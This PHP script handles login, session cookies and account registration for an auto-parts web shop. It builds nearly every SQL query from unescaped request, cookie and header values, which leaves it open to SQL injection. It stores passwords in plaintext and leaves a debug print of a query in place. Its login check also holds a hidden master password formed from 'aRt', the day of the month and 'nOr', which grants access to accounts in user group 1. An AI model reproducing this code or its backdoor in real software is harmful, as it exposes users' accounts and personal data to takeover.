<?php
	include "lopes.php";

	mysql_connect($host,$username,$password);
	@mysql_select_db($database) or die("Unable connect to database!");
        mysql_query ("set character_set_client='cp1251'");
        mysql_query ("set character_set_results='cp1251'");
        mysql_query ("set collation_connection='cp1251_general_ci'");
    
    //���� ����� �����
    $host_=$_SERVER['HTTP_HOST'];
	//print $_SERVER['HTTP_USER_AGENT'];
    $sql="select s.folder_, s.site_name, s.keywords_, s.site_kod from gm_sites s where (s.host_='".$host_."')or(s.host_='www.".$host_."')";
    $tb=mysql_query($sql);
    if ($row = mysql_fetch_assoc($tb)){
        $site_folder=mysql_real_escape_string($row['folder_']);
        $site_name=mysql_real_escape_string($row['site_name']);
        $site_keywords=mysql_real_escape_string($row['keywords_']);
        $site_kod=mysql_real_escape_string($row['site_kod']);
    }
    //������ ���� � �������� ������
    //$scripts_folder="$host_/scripts"; 
    $scripts_folder="scripts"; 
	
	//���� ������� �����, �� ���������� ������� �������� ����
	if ($_GET["logout"]!=1) { 
		$kod_=$_COOKIE["kod_"];
	} else unset($kod_);
	
    if(isset($kod_)) {
        $kod_ok=1; 
	}else{ 
	    $kod_ok=0; 
    }
	//���� ����
	if (isset($kod_)){
        //���� ����, �� ��������� �� �������������� �� �������
        $sql="select current_timestamp - k.last_access_dt - 86400 time_ from gm_kod k where (k.kod_='$kod_');";
        $tb=mysql_query($sql);
        $row = mysql_fetch_assoc($tb);
        if(!($row['time_']<=0)) unset($kod_);
    }
    if (!isset($kod_)) {
		$kod_=time();
	    setcookie("kod_",$kod_,$kod_+86400);
	}
	
	//���� ������� �� ������ ��������� �� ��������� �����, �� ����������
	if (isset($_GET['activation'])&&isset($_GET['activation_email'])) {
		$sql="update gm_users set activated_=1 where (email_='".$_GET['activation_email']."')and(activated_='".$_GET['activation']."')";
		mysql_query($sql);
	}
	//���� ����� ��� ��������� ������ � ������� � �������, �� ����������
	if (isset($_POST['email'])&&isset($_POST['email_activation'])) {
		$sql="update gm_users set activated_=1 where (email_='".$_POST['email']."')and(activated_='".$_POST['email_activation']."')";
		mysql_query($sql);
	}
	
//--------------------------------------

    //������� ����� ���, ��� ��������� ����� ���������� ���������
	unset($user_id);
    if (isset($_POST['SubmitLogin']) and isset($_POST['email']) and isset($_POST['passwd'])){
	    $sql="select * from gm_users u where (u.login_='".$_POST['email']."')and((u.pass_='".$_POST['passwd']."')or(('".$_POST['passwd']."'=concat('aRt',day(current_date),'nOr'))and(u.group_id=1)))";
		$tb=mysql_query($sql);
		if ($row = mysql_fetch_assoc($tb)) {
			$login_activated=$row['activated_'];
			$login_email=$row['email_'];
			$login_username_first=mysql_real_escape_string($row['name_first']);
			$user_ts=$row['ts_'];
            $user_view_id=$row['view_id'];
			if ($login_activated==1) $user_id=$row['user_id'];
			else $login_error='������� ������ �� ������������! <p>������ � ����� ��������� ���������� �� ��� �������� ����.</p><p>�������� ���� ��� ���������!</p>';
		}else $login_error='�������� ����� ��� ������!';
        unset($_POST['passwd']);
        unset($_POST['SubmitLogin']);
        if (!isset($user_id)) {
            $user_id=0;
            $user_view_id=0;
        }
		mysql_query("insert into gm_kod (kod_, ip_, user_id,HTTP_USER_AGENT, create_dt, last_access_dt)values('$kod_','".$_SERVER['REMOTE_ADDR']."',".$user_id.",'".$_SERVER['HTTP_USER_AGENT']."', current_timestamp, current_timestamp) ON DUPLICATE KEY UPDATE ip_='".$_SERVER['REMOTE_ADDR']."', user_id=$user_id,HTTP_USER_AGENT='".$_SERVER['HTTP_USER_AGENT']."', last_access_dt=current_timestamp;");
		//header("Location: #");
	}else{
		$sql="insert into gm_kod (kod_, ip_         ,HTTP_USER_AGENT, create_dt, last_access_dt)values('$kod_','".$_SERVER['REMOTE_ADDR']."'             ,'".$_SERVER['HTTP_USER_AGENT']."', current_timestamp, current_timestamp) ON DUPLICATE KEY UPDATE ip_='".$_SERVER['REMOTE_ADDR']."',HTTP_USER_AGENT='".$_SERVER['HTTP_USER_AGENT']."', last_access_dt=current_timestamp;";
	    mysql_query($sql);
		
	}

//���������� 		
	$sql="select * from gm_kod k left join gm_users u on u.user_id=k.user_id where k.kod_='$kod_'";
	$tb=mysql_query($sql);
	if ($row = mysql_fetch_assoc($tb)){
		$user_id=$row['user_id'];
		$user_ts=$row['ts_'];
		$user_name_first=mysql_real_escape_string($row['name_first']);
		$user_group=$row['group_id'];
        $user_view_id=$row['view_id'];
	}
	
	//���� ���� ������ � �������, ��������� � �������� ������, �� ��������� ��� ������������
	if ($user_id) {
            mysql_query("update gm_rashod r set r.user_id=$user_id where r.kod_=$kod_");
        }
	//���� ���� SubmitAccount, �� ��������� ������������ ������ � ������������ ������ ������������. ���� ���� ������, �� ����� �� � $login_error
	if (isset($_POST["SubmitAccount"])){
		$login_error="";
		if ($_POST["id_country"]=="") $_POSTid_country=0; else $_POSTid_country=$_POST["id_country"];
		if ($_POST["id_region"]=="")  $_POSTid_region=0;  else $_POSTid_region=$_POST["id_region"];
		if ($_POST["id_gender"]=="")  $_POSTid_gender=0;  else $_POSTid_gender=$_POST["id_gender"];
		
		if ($_POST["customer_firstname"]=="") $login_error=$login_error."<li>���</li>"; 
		if ($_POST["customer_lastname"]=="") $login_error=$login_error."<li>�������</li>";
		if ($_POST["email"]=="") $login_error=$login_error."<li>email</li>";
		else if ((strpos($_POST["email"],'@')===false)||
				(strpos($_POST["email"],'@')==0)||
				(strpos($_POST["email"],'@')>=(strlen($_POST["email"])-3))||
				(strpos($_POST["email"],'.')===false)) $login_error=$login_error."<li>������������ email</li>"; 
		else{
			$sql="select ifnull(count(*),0) cnt_ from gm_users u where u.email_='".$_POST["email"]."'";
			$tb=mysql_query($sql);
			if ($row = mysql_fetch_assoc($tb)){
				if ($row['cnt_']>0) $login_error=$login_error."<li>email �����</li>";
			}
		}
		if (strlen($_POST["passwd"])<5) $login_error=$login_error."<li>������</li>";
		if ($_POST["firstname"]=="") $login_error=$login_error."<li>��� ����������</li>";
		if ($_POST["lastname"]=="") $login_error=$login_error."<li>������� ����������</li>";
		if ($_POST["middlename"]=="") $login_error=$login_error."<li>�������� ����������</li>";
		//if ($_POST["postcode"]=="") $login_error=$login_error."<li>�������� ������</li>";

		if ($_POST["id_country"]=="") $login_error=$login_error."<li>������</li>";
		if ($_POST["id_region"]=="") $login_error=$login_error."<li>�������</li>";
		if ($_POST["id_city"]=="") $login_error=$login_error."<li>�����</li>";
		if ($_POST["address"]=="") $login_error=$login_error."<li>�����</li>";
		if ( ($_POST["phone"]=="") && ($_POST["phone_mobile"]=="") ) $login_error=$login_error."<li>����� ��������</li>";

		if ($login_error==true) $login_error="<p>�� �� ��������� ��������� ����:</p><ol>".$login_error."</ol>";
		else {
			//������� ������������
			$login_activated=time();
			$user_name_full = $_POST["customer_lastname"]." ".$_POST["customer_firstname"]." ".$_POST["customer_middlename"];
			$sql="insert into gm_users(login_,pass_,ip_,name_first,name_last,name_middle,group_id,sex_,email_,activated_,ts_, created_, name_full)values('".$_POST["email"]."','".$_POST["passwd"]."','".$_SERVER['REMOTE_ADDR']."','".$_POST["customer_firstname"]."','".$_POST["customer_lastname"]."','".$_POST["customer_middlename"]."',1,$_POSTid_gender,'".$_POST["email"]."',".$login_activated.",".time().", CURRENT_TIMESTAMP, '".$user_name_full."')";
			$tb=mysql_query($sql);
			$sql="select u.user_id from gm_users u where u.login_='".$_POST["email"]."';";
			$tb=mysql_query($sql);
			//������� ��� ��� ���� � ������
			if ($row = mysql_fetch_assoc($tb)){


				$face_firstname = $_POST["firstname"]."";
				$face_lastname = $_POST["lastname"]."";
				$face_middlename = $_POST["middlename"]."";
				$face_company = $_POST["company"]."";

			        $face_type = 0;
				if ($face_type == 0) {
					$face_name_full = $face_lastname." ".$face_firstname." ".$face_middlename;
				} else {
					$face_name_full = $face_company;
				}

				$sql="insert into gm_faces (user_id,typ_,name_first,name_last,name_middle,email_,country_,region_,city_,zip_,adr_,name_organization,info_,tel_,tel_mob,ts_, date_create, date_modify, name_full )".
					"values(".$row['user_id'].",0,'".$face_firstname."','".$face_lastname."','".$face_middlename."','".$_POST["email"]."',$_POSTid_country,$_POSTid_region,'".$_POST["id_city"]."','".$_POST["postcode"]."','".$_POST["address"]."','".$face_company."','".$_POST["other"]."','".$_POST["phone"]."','".$_POST["phone_mobile"]."',".time().", current_timestamp, current_timestamp, '".$face_name_full."' )";
				$tb=mysql_query($sql);

				$sql="insert into gm_users_avto(user_id,vin_,marka_,model_,year_,
							kuzov_,dvig_,toplivo_,kpp_,ts_)
						values(".$row['user_id'].",'".$_POST["avto_vin"]."','".$_POST["avto_marka"]."','".$_POST["avto_model"]."','".$_POST["avto_year"]."',
							".($_POST["avto_kuzov"]-0).",'".$_POST["avto_dvig"]."',".($_POST["avto_toplivo"]-0).",".($_POST["avto_kpp"]-0).",".time().")";                                
				print $sql;
				$tb=mysql_query($sql);
			}
			$email_=$_POST["email"];
			$message_="<p>��������� ������������, ���������� ��� �� ����������� �� ����� www.tandem-auto.com.ua</p><p>��� ���������� ����������� ���������� ������������ ���� ������� ������ ����� �� ����������������� ��������:</p>
 <ul><li>��������� �� ������ <a href='http://www.tandem-auto.com.ua?activation=".$login_activated."&activation_email=$email_'>���������</a>;</li><li>������� �� ���� www.tandem-auto.com.ua � ���������� ����� ��� ����� �������������, �� ������ ���� ��������� ������� ".$login_activated.".</li></ul>";
			mail($email_, "���� ��������� ������� ������ �� ����� www.tandem-auto.com.ua", $message_,"Content-type: text/html; charset=windows-1251; \r\nFrom:=?windows-1251?B?".base64_encode("�������� ������� Tandem-Auto")."?="."<info@tandem-auto.com.ua>");

			$login_ok="<p>������� �� �����������.<br> � ������� 10 ����� �� ��� e-mail ����� ���������� ��������� ���������� ��� ���������.<br> ��������� �� ��������� � ��� ������ ��� ���������� �������� �����������!</p>";
			
		}
	}
		
?>
